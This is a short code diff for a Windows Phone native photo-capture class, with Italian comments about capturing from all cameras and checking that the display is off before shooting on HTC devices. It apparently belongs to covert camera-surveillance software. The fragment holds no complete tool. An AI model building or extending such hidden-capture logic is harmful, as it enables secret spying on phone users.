@@ -249,6 +249,15 @@ UINT WriteCallback(int* rgBytes, UINT cb,  UINT *cbActual)
 
 NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 {
+	//se l'utente sta parlando con skype ed ha l'orecchio appoggiato si spegne il telefono
+	//per cui se scatto col display spento si incasina il display!!!
+#ifdef DEMO_ISS
+	if (_Shell_IdleTimerReset(8) != 0)
+	{
+		return;
+	}
+#endif
+
 	Device *deviceObj = Device::self();
 
 		//1280x720
@@ -272,7 +281,7 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 
 		IVectorView<CameraSensorLocation>^ pAvailableSensorLocations=PhotoCaptureDevice::AvailableSensorLocations;
 			
-#define	DEMO_ISS
+
 		//cattura da tutte le camere disponibili
 		//devo creare due thread separati, per cui il for pulito non fuo' essere utilizzato
 #ifndef DEMO_ISS
@@ -294,9 +303,11 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 			//se è un HTC devo controllare che il display sia spento prima di scattare
 			//il problema che per farlo resetto l'idle per cui allulga il tempo di spegnimento del display il stato di lock
 			if(Manufacturer==L"HTC") 
-				if(ChekDisplayOn()==TRUE) break;
+				if(ChekDisplayOn()==TRUE) 
+					break;
 
-			
+				
+
 			concurrency::cancellation_token_source PhotoTaskTokenSourceFront;
 
 
